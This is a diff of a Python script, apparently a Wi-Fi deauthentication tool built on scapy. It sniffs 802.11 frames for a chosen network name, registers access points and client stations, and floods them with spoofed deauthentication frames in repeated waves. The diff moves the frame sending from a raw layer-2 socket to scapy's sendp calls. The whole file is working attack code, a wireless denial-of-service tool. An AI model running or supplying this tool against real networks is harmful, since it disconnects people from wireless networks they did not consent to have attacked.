@@ -14,9 +14,8 @@
 import argparse
 import multiprocessing
 from re import compile as re_compile
-from scapy.config import conf as scapy_conf
+from scapy import sendrecv
 from scapy.layers import dot11
-from scapy.sendrecv import sniff as scapy_sniff
 import sys
 
 BROADCAST = 'ff:ff:ff:ff:ff:ff'
@@ -113,62 +112,68 @@ def register_sta(wifi_essid, bssid_sta, bssid_ap, bssids_stas_dict):
     except Exception as e:
         raise MsgException(e, 'Detected station could not be registered')
 
-def unicast_deauth(deauth_waves, deauth_socket, bssid_sta, bssid_ap, bssid_network):
+def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network):
     '''unicast deauthentication'''
     
     try:
         multiprocessing.Process(
             target = unicast_deauth_process,
-            args = (deauth_waves, deauth_socket, bssid_sta, bssid_ap, bssid_network),
+            args = (wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network),
         ).start()
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
     except Exception as e:
         raise MsgException(e, 'Unicast deauthentication frames could not be sent')
 
-def unicast_deauth_process(deauth_waves, deauth_socket, bssid_sta, bssid_ap, bssid_network):
+def unicast_deauth_process(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network):
     '''unicast deauthentication parallelism'''
     
     sys.stderr = sys.stdout = None
     for i in range(deauth_waves):
-        for i in range(DEAUTH_COUNT):
-            deauth_socket.send(
-                dot11.RadioTap() /
-                dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
-                dot11.Dot11Deauth(reason = 7)
-            )
-        for i in range(DEAUTH_COUNT):
-            deauth_socket.send(
-                dot11.RadioTap() /
-                dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
-                dot11.Dot11Deauth(reason = 7)
-            )
+        sendrecv.sendp(
+            dot11.RadioTap() /
+            dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
+            dot11.Dot11Deauth(reason = 7),
+            iface = wifi_interface,
+            count = DEAUTH_COUNT,
+            verbose = False,
+        )
+        sendrecv.sendp(
+            dot11.RadioTap() /
+            dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
+            dot11.Dot11Deauth(reason = 7),
+            iface = wifi_interface,
+            count = DEAUTH_COUNT,
+            verbose = False,
+        )
 
-def broadcast_deauth(deauth_waves, deauth_socket, bssid_ap, bssid_network):
+def broadcast_deauth(wifi_interface, deauth_waves, bssid_ap, bssid_network):
     '''broadcast deauthentication'''
     
     try:
         multiprocessing.Process(
             target = broadcast_deauth_process,
-            args = (deauth_waves, deauth_socket, bssid_ap, bssid_network),
+            args = (wifi_interface, deauth_waves, bssid_ap, bssid_network),
         ).start()
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
 
-def broadcast_deauth_process(deauth_waves, deauth_socket, bssid_ap, bssid_network):
+def broadcast_deauth_process(wifi_interface, deauth_waves, bssid_ap, bssid_network):
     '''broadcast deauthentication parallelism'''
     
     sys.stderr = sys.stdout = None
     for i in range(deauth_waves):
-        for i in range(DEAUTH_COUNT):
-                deauth_socket.send(
-                dot11.RadioTap() /
-                dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
-                dot11.Dot11Deauth(reason = 7)
-            )
+        sendrecv.sendp(
+            dot11.RadioTap() /
+            dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
+            dot11.Dot11Deauth(reason = 7),
+            iface = wifi_interface,
+            count = DEAUTH_COUNT,
+            verbose = False,
+        )
 
-def sniffer_wrapper(wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelist, deauth_socket, bssids_aps_dict, bssids_stas_dict):
+def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelist, bssids_aps_dict, bssids_stas_dict):
     def sniffer_handler(frame):
         '''sniffed frame processing'''
         
@@ -185,7 +190,7 @@ def sniffer_wrapper(wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelis
                                 if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                     register_ap(wifi_essid, bssid_src, bssid_network, bssids_aps_dict)
                                     if broadcast_enabled:
-                                        broadcast_deauth(deauth_waves, deauth_socket, bssid_src, bssid_network)
+                                        broadcast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_network)
                                 break
                             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                 
@@ -198,7 +203,7 @@ def sniffer_wrapper(wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelis
                                 if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                     register_ap(wifi_essid, bssid_dst, bssid_network, bssids_aps_dict)
                                     if broadcast_enabled:
-                                        broadcast_deauth(deauth_waves, deauth_socket, bssid_dst, bssid_network)
+                                        broadcast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_network)
                                 break
                             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                 
@@ -206,10 +211,10 @@ def sniffer_wrapper(wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelis
                 else:
                     if bssids_aps_dict.get(bssid_src) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                         register_sta(wifi_essid, bssid_dst, bssid_src, bssids_stas_dict)
-                        unicast_deauth(deauth_waves, deauth_socket, bssid_dst, bssid_src, bssid_network)
+                        unicast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_src, bssid_network)
                     elif bssids_aps_dict.get(bssid_dst) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
                         register_sta(wifi_essid, bssid_src, bssid_dst, bssids_stas_dict)
-                        unicast_deauth(deauth_waves, deauth_socket, bssid_src, bssid_dst, bssid_network)
+                        unicast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_dst, bssid_network)
         
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
@@ -274,16 +279,15 @@ def main():
         ]
         bssids_aps_dict = {} # {ap bssid: network bssid}
         bssids_stas_dict = {} # {sta bssid: ap bssid}
-        deauth_socket = scapy_conf.L2socket(iface = args.wifi_interface)
-        scapy_sniff(
+        sendrecv.sniff(
             iface = args.wifi_interface,
             filter = ' or '.join(filters),
             prn = sniffer_wrapper(
+                args.wifi_interface,
                 args.wifi_essid,
                 args.broadcast_enabled,
                 args.deauth_waves,
                 args.bssids_whitelist,
-                deauth_socket,
                 bssids_aps_dict,
                 bssids_stas_dict,
             ),
@@ -296,7 +300,6 @@ def main():
         try:
             for child in multiprocessing.active_children():
                 child.terminate()
-            deauth_socket.close()
         except:
             sys.exit(-1)
 
